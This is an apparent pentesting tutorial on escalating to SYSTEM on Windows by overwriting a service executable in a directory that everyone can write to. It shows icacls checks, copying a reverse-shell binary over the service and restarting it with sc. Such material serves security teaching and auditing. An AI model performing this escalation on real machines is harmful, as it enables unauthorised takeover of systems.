Weak Service Permissions - A Path to SYSTEM

Replacing Executables in Vulnerable Service Paths

The Vulnerability

A service running as SYSTEM has its executable or containing directory writable by low-privileged users (e.g., Everyone:F).

Exploitation

A low-privileged user replaces the legitimate service executable with a malicious one (e.g., a reverse shell).

Achieving SYSTEM

Upon service restart (manual or reboot), the malicious executable runs with SYSTEM privileges, granting full control.

Checking Permissions
C:\Users\User> icacls "C:\Program Files\VulnerableService"
  C:\Program Files\VulnerableService Everyone:(F)
                                      NT AUTHORITY\SYSTEM:(F)
                                      BUILTIN\Administrators:(F)
                                      BUILTIN\Users:(RX)

# Example of replacing the service executable
C:\Users\User> copy C:\Users\User\Desktop\shell.exe "C:\Program Files\VulnerableService\service.exe"
  1 file(s) copied.

# Restarting the service (if permissions allow)
C:\Users\User> sc stop VulnerableService
C:\Users\User> sc start VulnerableService
Key Takeaway

Always check service executable permissions; if writable by low-privileged users, it's a direct path to SYSTEM via executable replacement.
